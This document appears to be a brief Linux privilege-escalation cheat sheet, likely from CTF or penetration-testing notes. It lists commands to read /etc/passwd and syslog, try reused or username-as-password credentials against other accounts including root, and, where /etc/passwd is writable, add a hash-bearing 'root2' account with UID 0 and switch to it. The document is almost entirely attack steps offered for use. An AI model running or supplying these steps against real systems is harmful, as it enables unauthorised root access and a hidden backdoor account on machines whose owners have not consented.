```
cat /etc/passwd
```

```
cat /var/log/syslog
```

Look at what other users are on the machine and if you have a password from before, try it against those accounts including root to see if it works. Also try the username as the password.

> Also run the following to check for write access:

```
ls -la /etc/passwd
```

> If you have write access to /etc/passwd then do the following:

```
openssl passwd -1 salt root P@s$

echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2
Password: P@s$
```
